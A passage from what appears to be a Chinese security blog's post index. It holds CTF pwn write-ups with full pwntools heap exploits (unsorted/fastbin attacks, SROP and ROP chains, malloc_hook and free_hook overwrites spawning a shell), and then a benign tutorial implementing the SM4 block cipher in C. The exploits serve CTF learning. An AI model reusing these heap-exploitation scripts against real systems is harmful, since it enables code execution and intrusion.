sla("Choice:",'3') sla("index:",str(id))def change(id): sla("Choice:",'4') sla("index:",str(id))# link libc and heapadd(0,0x88,'a')add(1,0x88,'b')add(2,0x88,'c')add(3,0x88,'d')delete(0)show(0)ru("note[0]: ")main_arena = u64(rc(6).ljust(8,'\x00'))-88libc_base = main_arena - 0x3c4b20global_max_fast = libc_base + 0x3c67f8setcontext = libc_base + libc.symbols['setcontext']pop_rax = libc_base + 0x33544pop_rdi = libc_base + 0x21102pop_rsi = libc_base + 0x202e8pop_rdx = libc_base + 0x1b92syscall = libc_base + 0xbc375ret = libc_base + 0x937log.warn("main_arena --&gt; %s",hex(main_arena))log.warn("libc_base --&gt; %s",hex(libc_base))delete(2)show(2)ru("note[2]: ")heap_base = u64(rc(6).ljust(8,'\x00'))-0x230log.warn("heap_base --&gt; %s",hex(heap_base))delete(1)delete(3)# global_max_fast attackadd(4, 0x238, ('a' * 0x88 + p64(0x91) ) * 3)payload = p64(0) * 8 + p64(setcontext + 0x35)payload = payload.ljust(0x70, 'c') + p64(0) + p64(0x21)add(5, 0x88, payload)delete(4)delete(1)add(6,0x238,'a'*0x80 + p64(0) + p64(0x91) + p64(global_max_fast-0x10)*2)add(7,0x88,'a') # unsorted bin attackdelete(4)add(8,0x238,'a'*0x80 + p64(0) + p64(0x231))delete(1)delete(4)add(9,0x238,'a'*0x80 + p64(0) + p64(0x231) + p64(heap_base)) # fastbin attack# orw-payflag_addr = heap_base + 0x3d0pay = p64(pop_rax) + p64(0x2)# pay += p64(pop_rdi) + p64(flag_addr)pay += p64(syscall) #open("flag")pay += p64(pop_rdi) + p64(4)pay += p64(pop_rsi) + p64(heap_base + 0x100)pay += p64(pop_rdx) + p64(0x100)pay += p64(pop_rax) + p64(0)pay += p64(syscall) #read(fp,buf,0x100)pay += p64(pop_rdi) + p64(1)pay += p64(pop_rax) + p64(1)pay += p64(syscall) #write(1,buf,0x100)pay = pay.ljust(0x100,'b')pay += "flag\x00"add(10,0x228,pay)vtable_addr = heap_base + 0x480frame = SigreturnFrame()frame.rsp = heap_base + 0x2d0frame.rip = retframe.rdi = flag_addrframe.rsi = 0frame.rdx = heap_base + 0x1000pay = str(frame)pay = pay[:0xd8] + p64(vtable_addr) + pay[0xe0:]add(11,0x228,pay)gdb.attach(p,"b *0x555555555100")change(0)# debug()p.interactive() snote常规题，4个功能，add,show,free,edit，edit中可以溢出8个字节 12345if ( n + 8 &lt; nbytes ) &#123; puts("Too long..."); exit(1); &#125; delete 中存在UAF，且只能用一次 12345if ( dword_202010 &gt; 0 ) &#123; free(ptr); --dword_202010; &#125; 思路：house of force将top chunk放到unsorted bin，申请出来show泄漏libc地址；利用UAF申请到fack chunk修改malloc_hook为onegadget exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#coding:utf-8from pwn import *context.log_level = 'debug'local = 0if local: p = process('./pwn') elf = ELF('./pwn') libc = elf.libcelse: p = remote("55fca716.gamectf.com","37009") elf = ELF('./pwn') libc = elf.libc#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)def init(): sla("name?\n","R4bb1t")def add(size,data): sla("&gt; ",'1') sla("&gt; ",str(size)) sla("&gt; \n",data)def show(): sla("&gt; ",'2')def delete(): sla("&gt; ",'3')def edit(size,data): sla("&gt; ",'4') sla("&gt; ",str(size)) sda("&gt; \n",data)one = [0x45216,0x4526a,0xf02a4,0xf1147]init()add(0x28,'a')edit(0x30,'b'*0x28 + p64(0xfd1))add(0xfe0,'b')add(0x68,'')show()main_arena = u64(rc(6).ljust(8,'\x00'))-0xa-1504libc_base = main_arena - 0x3c4b20malloc_hook = libc_base + libc.symbols['__malloc_hook']fack_chunk = malloc_hook - 0x23onegadget = libc_base + one[2]log.success("main_arena --&gt; %s",hex(main_arena))log.success("libc_base --&gt; %s",hex(libc_base))log.success("fack_chunk --&gt; %s",hex(fack_chunk))delete()edit(0x68,p64(fack_chunk))add(0x68,'a')pay = 0x13*'a' + p64(onegadget)add(0x68,pay)sla("&gt; ",'1')sla("&gt; ",str(32))# gdb.attach(p)p.interactive()]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TokyoWesterns -- Asterisk_Alloc]]></title>
    <url>%2F2020%2F06%2F21%2FTokyoWesterns-Asterisk-Alloc%2F</url>
    <content type="text"><![CDATA[很有意思的一题，主要考察realloc函数checksec:保护全开，libc2.27，引入了tcache 机制12345Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 程序提供了3种申请堆的申请方式，malloc、calloc、realloc，分别放在全局变量ptr_m，ptr_c，ptr_r且只能放一个，以及一个free函数，但是存在UAF。realloc这个函数有点意思 ： 1234realloc(0) --&gt; free并清空指针realloc(new_size&lt;old_size) --&gt; eidtrealloc(new_size&gt;old_size) --&gt; 扩展realloc(size) --&gt; add 没有show功能，所以只能通过IO_file泄漏地址方法：12345申请3个chunk:chunk1-0x70,chunk2-0x100,chunk3-0xe0然后free(chunk2)8次放到unsorted bin中，此时chunk2的fd,bk已经写入了main_arena+96再申请回0x70,reallox(0x180)扩展修改低4位为_IO_2_1_stdout_(爆破一位)再修改flag为0xfbad1800，write_base低一位为0打印出libc地址最后UAF修改free_hook为system,free(&apos;/bin/sh&apos;)即可 exp:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980from pwn import *# context.log_level = 'debug'context.arch = 'amd64'local = 1if local: p = process('./pwn') elf = ELF('./pwn') libc = elf.libcelse: p = remote("")sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)def malloc(size,message): sla("choice: ",'1') sla("Size: ",str(size)) sda("Data: ",message)def calloc(size,message): sla("choice: ",'2') sla("Size: ",str(size)) sda("Data: ",message)def realloc(size,message=''): sla("choice: ",'3') sla("Size: ",str(size)) if size != 0: sda("Data: ",message)def free(type): sla("choice: ",'4') sla("Which: ",type)def pwn(): realloc(0x70,'a' + '\n') realloc(0) realloc(0x100,'b' + '\n') realloc(0) realloc(0xe0,'c' + '\n') realloc(0) realloc(0x100,'b' + '\n') for _ in range(7): free('r') realloc(0) realloc(0x70,'a' + '\n') realloc(0x180,'a'*0x70 + p64(0) + p64(0x71) + '\x60\xe7') realloc(0) realloc(0x100,'cccc') realloc(0) # gdb.attach(p) malloc(0x100,p64(0xfbad1800) + p64(0)*3 + '\x00') libc_base = u64(p.recvuntil('\x7f',timeout=1)[-6:].ljust(8,'\x00')) - 0x3ed8b0 free_hook = libc_base + libc.symbols['__free_hook'] system = libc_base + libc.symbols['system'] log.warn("libc_base --&gt; %s",hex(libc_base)) realloc(0x180,0x70*'a' + p64(0) + p64(0x30) + p64(free_hook) + '\n') realloc(0) realloc(0x68,'abcd') realloc(0) realloc(0x68,p64(system)) calloc(0x28,'/bin/sh\x00') free('c') # gdb.attach(p) p.interactive()i = 0while 1: try: i += 1 log.warn("i = " + str(i)) pwn() except Exception: p.close() p = process('./pwn')]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[国密加密算法sm4]]></title>
    <url>%2F2020%2F06%2F21%2Fsm4%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[概述SM4加密算法属于对称加密算法，2012年3月，国家密码管理局正式公布了包含SM4分组密码算法在内的《祖冲之序列密码算法》等6项密码行业标准。与DES和AES算法类似，SM4算法是一种分组密码算法。其分组长度为128bit，密钥长度也为128bit。加密算法与密钥扩展算法均采用32轮非线性迭代结构，以字（32位）为单位进行加密运算，每一次迭代运算均为一轮变换函数F。SM4算法加/解密算法的结构相同，只是使用轮密钥相反，其中解密轮密钥是加密轮密钥的逆序。 SM4算法结构图：(图片来源网上) 参数介绍​ 1、字节：由8位2进制数表示 ，字：由32位2进制数表示； ​ 2、S盒：固定的8bit输入、输出转换数组； ​ 3、加密密钥长度为128bit，表示为MK=（MK0,MK1,MK2,MK3），其中MKi为字。轮密钥表示为rki(i=0,1,2,3……31)为字。FK = (FK0,FK1,FK2,FK3)为系统 参数,CK = (CK0,CK1,CK2,……,CK31)为固定参数，都为字。 加密加密原理这里就不讲了，网上有不少详细的文章，下面直接开始算法的实现。 在开始加密算法之前，先介绍几个宏定义： 123456789101112131415161718192021222324//将字符型数组b的第i到第i+3位的二进制拼接成一个4*8=32bit的整数，存入n中#define GET_ULONG_BE(n,b,i) \&#123; \ (n) = ( (unsigned long) (b)[(i) ] &lt;&lt; 24 ) \ | ( (unsigned long) (b)[(i) + 1] &lt;&lt; 16 ) \ | ( (unsigned long) (b)[(i) + 2] &lt;&lt; 8 ) \ | ( (unsigned long) (b)[(i) + 3] ); \&#125;#endif//将整数n的32位的二进制表示转换为4个char的数组，存入数组b的第i到第i+3位#ifndef PUT_ULONG_BE#define PUT_ULONG_BE(n,b,i) \&#123; \ (b)[(i) ] = (unsigned char) ( (n) &gt;&gt; 24 ); \ (b)[(i) + 1] = (unsigned char) ( (n) &gt;&gt; 16 ); \ (b)[(i) + 2] = (unsigned char) ( (n) &gt;&gt; 8 ); \ (b)[(i) + 3] = (unsigned char) ( (n) ); \&#125;#endif//循环左移 的巧妙实现（SHL(x,n)可以得到左移n位之后的结果，然后与右移的结果((x) &gt;&gt; (32 - n))逐位或来将右边空缺的n位补齐，效率比较高。） #define SHL(x,n) (((x) &amp; 0xFFFFFFFF) &lt;&lt; n)#define ROTL(x,n) (SHL((x),n) | ((x) &gt;&gt; (32 - n)))//交换#define SWAP(a,b) &#123; unsigned long t = a; a = b; b = t; t = 0; &#125; 密钥调试算法先建立一个结构体来保存上下文信息，即加密模式和各轮子密钥：(这个结构体我是定义在sm4.h头文件中) 123456typedef struct&#123; int mode; /*!&lt; encrypt/decrypt */ unsigned long sk[32]; /*!&lt; SM4 subkeys */&#125;sm4_context; 首先需要设置密钥，调用sm4_setkey_enc(&amp;ctx,key);函数，这个函数会设置mode为加密，并调用sm4_setkey(ctx-&gt;sk,key);函数来完成密钥的操作 12345678910111213141516171819202122void sm4_setkey_enc(sm4_context *ctx,unsigned char key[16])&#123; ctx-&gt;mode = SM4_ENCRYPT; sm4_setkey(ctx-&gt;sk,key);&#125;static void sm4_setkey(unsigned long SK[32],unsigned char key[16])&#123; unsigned long MK[4]; unsigned long k[36]; unsigned long i = 0; //先通过宏将初始的密钥转换为4个32位bit的整数，并为计算各轮密钥预先准备好初始值 GET_ULONG_BE(MK[0],key,0); GET_ULONG_BE(MK[1],key,4); GET_ULONG_BE(MK[2],key,8); GET_ULONG_BE(MK[3],key,12); k[0] = MK[0]^FK[0]; k[1] = MK[1]^FK[1]; k[2] = MK[2]^FK[2]; k[3] = MK[3]^FK[3]; for(;i&lt;32;i++)&#123; k[i+4] = k[i]^sm4CaliRk(k[i+1]^k[i+2]^k[i+3]^CK[i]); SK[i] = k[i+4]; &#125; &#125; 对于第i轮的密钥SK[i]，其是由k[i]和对k[i+1]^k[i+2]^k[i+3]^CK[i]的复合变换T‘异或得到的： SK[i] = k[i+4] = k[i]^sm4CaliRk(k[i+1]^k[i+2]^k[i+3]^CK[i]);函数sm4CaliRk就是变换T’,先进行Sbox的非线性替换，然后进行线性变换，线性变换L为：rk = bb^(ROTL(bb, 13))^(ROTL(bb, 23)); 123456789101112131415static unsigned long sm4CaliRk(unsigned long ka)&#123; //复合变换T unsigned long bb = 0; //unsigned long 4字节( 32bit ) unsigned long rk = 0; unsigned char a[4]; unsigned char b[4]; PUT_ULONG_BE(ka,a,0) //换转成8bit一个字符 b[0] = sm4Sbox(a[0]); b[1] = sm4Sbox(a[1]); b[2] = sm4Sbox(a[2]); b[3] = sm4Sbox(a[3]); GET_ULONG_BE(bb,b,0) //将变换结果转换为32bit的整数 //对得到的32位整数bb进行线性变换 rk = bb^ROTL(bb,13)^ROTL(bb,23); return rk;&#125; 至此，密钥就已经生成了 加密过程调用函数void sm4_crypt_ecb( sm4_context *ctx, int mode, int length, unsigned char *input, unsigned char *output)对密文input进行电码本模式加密(ECB)，加密的核心是调用了static void sm4_one_round( unsigned long sk[32], unsigned char input[16], unsigned char output[16] )函数对第一块密文进行加密 1234567891011121314151617181920212223242526272829303132333435363738394041void sm4_crypt_ecb( sm4_context *ctx, int mode, int length, unsigned char *input, unsigned char *output)&#123; while( length &gt; 0 ) &#123; sm4_one_round( ctx-&gt;sk, input, output ); input += 16; output += 16; length -= 16; &#125; &#125;static void sm4_one_round( unsigned long sk[32], unsigned char input[16], unsigned char output[16] )&#123; unsigned long i = 0; unsigned long ulbuf[36]; memset(ulbuf, 0, sizeof(ulbuf)); GET_ULONG_BE( ulbuf[0], input, 0 ) GET_ULONG_BE( ulbuf[1], input, 4 ) GET_ULONG_BE( ulbuf[2], input, 8 ) GET_ULONG_BE( ulbuf[3], input, 12 ) while(i&lt;32) &#123; ulbuf[i+4] = sm4F(ulbuf[i], ulbuf[i+1], ulbuf[i+2], ulbuf[i+3], sk[i]);// #ifdef _DEBUG// printf("rk(%02d) = 0x%08x, X(%02d) = 0x%08x \n",i,sk[i], i, ulbuf[i+4] );// #endif i++; &#125; PUT_ULONG_BE(ulbuf[35],output,0); PUT_ULONG_BE(ulbuf[34],output,4); PUT_ULONG_BE(ulbuf[33],output,8); PUT_ULONG_BE(ulbuf[32],output,12);&#125; sm4_one_round()函数中，先将128位的输入input转为四个32位的整数，放入ulbuf[4]中，然后迭代地调用函数static unsigned long sm4F(unsigned long x0, unsigned long x1, unsigned long x2, unsigned long x3, unsigned long rk)进行32轮加密，第一轮加密都需要使用之前的128位的结果ulbuf[i], ulbuf[i+1], ulbuf[i+2], ulbuf[i+3]和该轮的密钥 sk[i]，产生出该轮的密文ulbuf[i+4]，最后的密文存储在ulbuf[35]~ulbuf[32]中，转换为字符数组形式放入output 中。 12345//一轮加密 static unsigned long sm4F(unsigned long x0, unsigned long x1, unsigned long x2, unsigned long x3, unsigned long rk)&#123; return (x0^sm4Lt(x1^x2^x3^rk));&#125; sm4Lt()是一个合成变换，由非线性变换t和线性变换L复合而成：首先将输入的整数 ka 转换为8比特一个的字符，然后使用S盒进行线性变换，再将变换结果转为32比特的整数，最后对得到的32位整数bb进行线性变换：c =bb^(ROTL(bb, 2))^(ROTL(bb, 10))^(ROTL(bb, 18))^(ROTL(bb, 24)); 12345678910111213141516171819static unsigned long sm4Lt(unsigned long ka)&#123; unsigned long bb = 0; unsigned long c = 0; unsigned char a[4]; unsigned char b[4]; PUT_ULONG_BE(ka,a,0)// b[0] = sm4Sbox(a[0]);// b[1] = sm4Sbox(a[1]);// b[2] = sm4Sbox(a[2]);// b[3] = sm4Sbox(a[3]); b[0] = Sbox[a[0]]; b[1] = Sbox[a[1]]; b[2] = Sbox[a[2]]; b[3] = Sbox[a[3]]; GET_ULONG_BE(bb,b,0) c =bb^(ROTL(bb, 2))^(ROTL(bb, 10))^(ROTL(bb, 18))^(ROTL(bb, 24)); return c;&#125; 整个加密过程就结束了，不过上面提到的是ECB的加密模式：又称电子密码本模式：Electronic codebook，是最简单的块密码加密模式，加密前根据加密块大小（如AES为128位）分成若干块，之后将每块使用相同的密钥单独加密，解密同理。这种加密不能很好地隐藏数据模式。 SM4常见的也有另一种加密模式：CBC：密码分组链接（CBC，Cipher-block chaining）模式，由IBM于1976年发明，每个明文块先与前一个密文块进行异或后，再进行加密。在这种方法中，每个密文块都依赖于它前面的所有明文块。同时，为了保证每条消息的唯一性，在第一个块中需要使用初始化向量IV。 1234567891011121314151617181920212223242526272829303132333435363738394041424344//CBC模式加解密 void sm4_crypt_cbc( sm4_context *ctx, int mode, int length, unsigned char iv[16], unsigned char *input, unsigned char *output )&#123; int i; unsigned char temp[16]; if( mode == SM4_ENCRYPT ) &#123; while( length &gt; 0 ) &#123; for( i = 0; i &lt; 16; i++ ) output[i] = (unsigned char)( input[i] ^ iv[i] ); sm4_one_round( ctx-&gt;sk, output, output ); memcpy( iv, output, 16 ); input += 16; output += 16; length -= 16; &#125; &#125; else /* SM4_DECRYPT */ &#123; while( length &gt; 0 ) &#123; memcpy( temp, input, 16 ); sm4_one_round( ctx-&gt;sk, input, output ); for( i = 0; i &lt; 16; i++ ) output[i] = (unsigned char)( output[i] ^ iv[i] ); memcpy( iv, temp, 16 ); input += 16; output += 16; length -= 16; &#125; &#125;&#125; 解密过程解密前，首先要通过void sm4_setkey_dec( sm4_context *ctx, unsigned char key[16] )函数设定解密时使用的key，这个函数还会将密钥的顺序倒置，然后调用sm4_crypt_ecb()即可解密。 实际上，SM4的解密变换与加密变换结构相同，不同的仅仅是轮密钥的使用顺序相反。 完整的代码sm4.h文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100/** * \file sm4.h */#ifndef XYSSL_SM4_H#define XYSSL_SM4_H #define SM4_ENCRYPT 1#define SM4_DECRYPT 0#ifndef GET_ULONG_BE//将字符型数组b的第i到第i+3位的二进制拼接成一个4*8=32bit的整数，存入n中#define GET_ULONG_BE(n,b,i) \&#123; \ (n) = ( (unsigned long) (b)[(i) ] &lt;&lt; 24 ) \ | ( (unsigned long) (b)[(i) + 1] &lt;&lt; 16 ) \ | ( (unsigned long) (b)[(i) + 2] &lt;&lt; 8 ) \ | ( (unsigned long) (b)[(i) + 3] ); \&#125;#endif//将整数n的32位的二进制表示转换为4个char的数组，存入数组b的第i到第i+3位#ifndef PUT_ULONG_BE#define PUT_ULONG_BE(n,b,i) \&#123; \ (b)[(i) ] = (unsigned char) ( (n) &gt;&gt; 24 ); \ (b)[(i) + 1] = (unsigned char) ( (n) &gt;&gt; 16 ); \ (b)[(i) + 2] = (unsigned char) ( (n) &gt;&gt; 8 ); \ (b)[(i) + 3] = (unsigned char) ( (n) ); \&#125;#endif//循环左移 的巧妙实现（SHL(x,n)可以得到左移n位之后的结果，然后与右移的结果((x) &gt;&gt; (32 - n))逐位或来将右边空缺的n位补齐，效率比较高。） #define SHL(x,n) (((x) &amp; 0xFFFFFFFF) &lt;&lt; n)#define ROTL(x,n) (SHL((x),n) | ((x) &gt;&gt; (32 - n)))#define SWAP(a,b) &#123; unsigned long t = a; a = b; b = t; t = 0; &#125; /** * \brief SM4 context structure */typedef struct&#123; int mode; /*!&lt; encrypt/decrypt */ unsigned long sk[32]; /*!&lt; SM4 subkeys */&#125;sm4_context; #ifdef __cplusplusextern "C" &#123;#endif /** * \brief SM4 key schedule (128-bit, encryption) * * \param ctx SM4 context to be initialized * \param key 16-byte secret key */void sm4_setkey_enc( sm4_context *ctx, unsigned char key[16] ); /** * \brief SM4 key schedule (128-bit, decryption) * * \param ctx SM4 context to be initialized * \param key 16-byte secret key */void sm4_setkey_dec( sm4_context *ctx, unsigned char key[16] ); /** * \brief SM4-ECB block encryption/decryption * \param ctx SM4 context * \param mode SM4_ENCRYPT or SM4_DECRYPT * \param length length of the input data * \param input input block * \param output output block */void sm4_crypt_ecb( sm4_context *ctx, int mode, int length, unsigned char *input, unsigned char *output); /** * \brief SM4-CBC buffer encryption/decryption * \param ctx SM4 context * \param mode SM4_ENCRYPT or SM4_DECRYPT * \param length length of the input data * \param iv initialization vector (updated after use) * \param input buffer holding the input data * \param output buffer holding the output data */void sm4_crypt_cbc( sm4_context *ctx, int mode, int length, unsigned char iv[16], unsigned char *input, unsigned char *output ); #ifdef __cplusplus&#125;#endif #endif /* sm4.h */ sm4.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229#include &lt;iostream&gt;#include &lt;string.h&gt;#include "sm4.h"using namespace std; //S盒 const unsigned char Sbox[256] = &#123; 0xd6,0x90,0xe9,0xfe,0xcc,0xe1,0x3d,0xb7,0x16,0xb6,0x14,0xc2,0x28,0xfb,0x2c,0x05, 0x2b,0x67,0x9a,0x76,0x2a,0xbe,0x04,0xc3,0xaa,0x44,0x13,0x26,0x49,0x86,0x06,0x99, 0x9c,0x42,0x50,0xf4,0x91,0xef,0x98,0x7a,0x33,0x54,0x0b,0x43,0xed,0xcf,0xac,0x62, 0xe4,0xb3,0x1c,0xa9,0xc9,0x08,0xe8,0x95,0x80,0xdf,0x94,0xfa,0x75,0x8f,0x3f,0xa6, 0x47,0x07,0xa7,0xfc,0xf3,0x73,0x17,0xba,0x83,0x59,0x3c,0x19,0xe6,0x85,0x4f,0xa8, 0x68,0x6b,0x81,0xb2,0x71,0x64,0xda,0x8b,0xf8,0xeb,0x0f,0x4b,0x70,0x56,0x9d,0x35, 0x1e,0x24,0x0e,0x5e,0x63,0x58,0xd1,0xa2,0x25,0x22,0x7c,0x3b,0x01,0x21,0x78,0x87, 0xd4,0x00,0x46,0x57,0x9f,0xd3,0x27,0x52,0x4c,0x36,0x02,0xe7,0xa0,0xc4,0xc8,0x9e, 0xea,0xbf,0x8a,0xd2,0x40,0xc7,0x38,0xb5,0xa3,0xf7,0xf2,0xce,0xf9,0x61,0x15,0xa1, 0xe0,0xae,0x5d,0xa4,0x9b,0x34,0x1a,0x55,0xad,0x93,0x32,0x30,0xf5,0x8c,0xb1,0xe3, 0x1d,0xf6,0xe2,0x2e,0x82,0x66,0xca,0x60,0xc0,0x29,0x23,0xab,0x0d,0x53,0x4e,0x6f, 0xd5,0xdb,0x37,0x45,0xde,0xfd,0x8e,0x2f,0x03,0xff,0x6a,0x72,0x6d,0x6c,0x5b,0x51, 0x8d,0x1b,0xaf,0x92,0xbb,0xdd,0xbc,0x7f,0x11,0xd9,0x5c,0x41,0x1f,0x10,0x5a,0xd8, 0x0a,0xc1,0x31,0x88,0xa5,0xcd,0x7b,0xbd,0x2d,0x74,0xd0,0x12,0xb8,0xe5,0xb4,0xb0, 0x89,0x69,0x97,0x4a,0x0c,0x96,0x77,0x7e,0x65,0xb9,0xf1,0x09,0xc5,0x6e,0xc6,0x84, 0x18,0xf0,0x7d,0xec,0x3a,0xdc,0x4d,0x20,0x79,0xee,0x5f,0x3e,0xd7,0xcb,0x39,0x48 &#125;;//CK为固定参数 const unsigned int CK[32] = &#123; 0x00070e15, 0x1c232a31, 0x383f464d, 0x545b6269, 0x70777e85, 0x8c939aa1, 0xa8afb6bd, 0xc4cbd2d9, 0xe0e7eef5, 0xfc030a11, 0x181f262d, 0x343b4249, 0x50575e65, 0x6c737a81, 0x888f969d, 0xa4abb2b9, 0xc0c7ced5, 0xdce3eaf1, 0xf8ff060d, 0x141b2229, 0x30373e45, 0x4c535a61, 0x686f767d, 0x848b9299, 0xa0a7aeb5, 0xbcc3cad1, 0xd8dfe6ed, 0xf4fb0209, 0x10171e25, 0x2c333a41, 0x484f565d, 0x646b7279 &#125;;//FK为系统参数 static const unsigned long FK[4] = &#123;0xa3b1bac6,0x56aa3350,0x677d9197,0xb27022dc&#125;;static unsigned char sm4Sbox(unsigned char inch)&#123; unsigned char *pTable = (unsigned char *)Sbox; unsigned char retVal = (unsigned char)(pTable[inch]); return retVal;&#125;//已知加密密钥MK，求轮转密钥rkstatic unsigned long sm4CaliRk(unsigned long ka)&#123; //复合变换T unsigned long bb = 0; //unsigned long 4字节( 32bit ) unsigned long rk = 0; unsigned char a[4]; unsigned char b[4]; PUT_ULONG_BE(ka,a,0) //换转成8bit一个字符 b[0] = sm4Sbox(a[0]); b[1] = sm4Sbox(a[1]); b[2] = sm4Sbox(a[2]); b[3] = sm4Sbox(a[3]); GET_ULONG_BE(bb,b,0) //将变换结果转换为32bit的整数 //对得到的32位整数bb进行线性变换 rk = bb^ROTL(bb,13)^ROTL(bb,23); return rk;&#125;static void sm4_setkey(unsigned long SK[32],unsigned char key[16])&#123; unsigned long MK[4]; unsigned long k[36]; unsigned long i = 0; GET_ULONG_BE(MK[0],key,0); GET_ULONG_BE(MK[1],key,4); GET_ULONG_BE(MK[2],key,8); GET_ULONG_BE(MK[3],key,12); k[0] = MK[0]^FK[0]; k[1] = MK[1]^FK[1]; k[2] = MK[2]^FK[2]; k[3] = MK[3]^FK[3]; for(;i&lt;32;i++)&#123; k[i+4] = k[i]^sm4CaliRk(k[i+1]^k[i+2]^k[i+3]^CK[i]); SK[i] = k[i+4]; &#125; &#125;void sm4_setkey_enc(sm4_context *ctx,unsigned char key[16])&#123; ctx-&gt;mode = SM4_ENCRYPT; sm4_setkey(ctx-&gt;sk,key);&#125;static unsigned long sm4Lt(unsigned long ka)&#123; unsigned long bb = 0; unsigned long c = 0; unsigned char a[4]; unsigned char b[4]; PUT_ULONG_BE(ka,a,0)// b[0] = sm4Sbox(a[0]);// b[1] = sm4Sbox(a[1]);// b[2] = sm4Sbox(a[2]);// b[3] = sm4Sbox(a[3]); b[0] = Sbox[a[0]]; b[1] = Sbox[a[1]]; b[2] = Sbox[a[2]]; b[3] = Sbox[a[3]]; GET_ULONG_BE(bb,b,0) c =bb^(ROTL(bb, 2))^(ROTL(bb, 10))^(ROTL(bb, 18))^(ROTL(bb, 24)); return c;&#125;//一轮加密 static unsigned long sm4F(unsigned long x0, unsigned long x1, unsigned long x2, unsigned long x3, unsigned long rk)&#123; return (x0^sm4Lt(x1^x2^x3^rk));&#125;static void sm4_one_round( unsigned long sk[32], unsigned char input[16], unsigned char output[16] )&#123; unsigned long i = 0; unsigned long ulbuf[36]; memset(ulbuf, 0, sizeof(ulbuf)); GET_ULONG_BE( ulbuf[0], input, 0 ) GET_ULONG_BE( ulbuf[1], input, 4 ) GET_ULONG_BE( ulbuf[2], input, 8 ) GET_ULONG_BE( ulbuf[3], input, 12 ) while(i&lt;32) &#123; ulbuf[i+4] = sm4F(ulbuf[i], ulbuf[i+1], ulbuf[i+2], ulbuf[i+3], sk[i]);// #ifdef _DEBUG// printf("rk(%02d) = 0x%08x, X(%02d) = 0x%08x \n",i,sk[i], i, ulbuf[i+4] );// #endif i++; &#125; PUT_ULONG_BE(ulbuf[35],output,0); PUT_ULONG_BE(ulbuf[34],output,4); PUT_ULONG_BE(ulbuf[33],output,8); PUT_ULONG_BE(ulbuf[32],output,12);&#125;//ECB模式 void sm4_crypt_ecb( sm4_context *ctx, int mode, int length, unsigned char *input, unsigned char *output)&#123; while( length &gt; 0 ) &#123; sm4_one_round( ctx-&gt;sk, input, output ); input += 16; output += 16; length -= 16; &#125; &#125;//ECB模式解密密钥 void sm4_setkey_dec( sm4_context *ctx, unsigned char key[16] )&#123; int i; ctx-&gt;mode = SM4_ENCRYPT; sm4_setkey( ctx-&gt;sk, key ); for( i = 0; i &lt; 16; i ++ ) &#123; SWAP( ctx-&gt;sk[ i ], ctx-&gt;sk[ 31-i] ); &#125;&#125;//CBC模式加解密 void sm4_crypt_cbc( sm4_context *ctx, int mode, int length, unsigned char iv[16], unsigned char *input, unsigned char *output )&#123; int i; unsigned char temp[16]; if( mode == SM4_ENCRYPT ) &#123; while( length &gt; 0 ) &#123; for( i = 0; i &lt; 16; i++ ) output[i] = (unsigned char)( input[i] ^ iv[i] ); sm4_one_round( ctx-&gt;sk, output, output ); memcpy( iv, output, 16 ); input += 16; output += 16; length -= 16; &#125; &#125; else /* SM4_DECRYPT */ &#123; while( length &gt; 0 ) &#123; memcpy( temp, input, 16 ); sm4_one_round( ctx-&gt;sk, input, output ); for( i = 0; i &lt; 16; i++ ) output[i] = (unsigned char)( output[i] ^ iv[i] ); memcpy( iv, temp, 16 ); input += 16; output += 16; length -= 16; &#125; &#125;&#125; int main()&#123; unsigned char key[16] = &#123;0x01,0x23,0x45,0x67,0x89,0xab,0xcd,0xef,0xfe,0xdc,0xba,0x98,0x76,0x54,0x32,0x10&#125;; unsigned char input[16] = &#123;0x01,0x23,0x45,0x67,0x89,0xab,0xcd,0xef,0xfe,0xdc,0xba,0x98,0x76,0x54,0x32,0x10&#125;; unsigned char output[16]; sm4_context ctx; unsigned long i; //encrypt sm4_setkey_enc(&amp;ctx,key); sm4_crypt_ecb(&amp;ctx,1,16,input,output); //加密结果 printf("加密结果：\n"); for(i = 0;i&lt; 16;i ++)&#123; printf("%02x ",output[i]); &#125; printf("\n"); sm4_setkey_dec(&amp;ctx,key); sm4_crypt_ecb(&amp;ctx,0,16,output,output); //解密结果 printf("解密结果：\n"); for(i = 0;i&lt; 16;i ++)&#123; printf("%02x ",output[i]); &#125; printf("\n"); return 0; &#125; 参数文章：https://blog.csdn.net/cg129054036/article/details/83012721 https://blog.csdn.net/cg129054036/article/details/83016958 https://blog.csdn.net/archimekai/article/details/53095993]]></content>
      <categories>
        <category>crypto</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[shellcode 的艺术]]></title>
    <url>%2F2020%2F06%2F21%2Fshellcode%E7%9A%84%E8%89%BA%E6%9C%AF%2F</url>
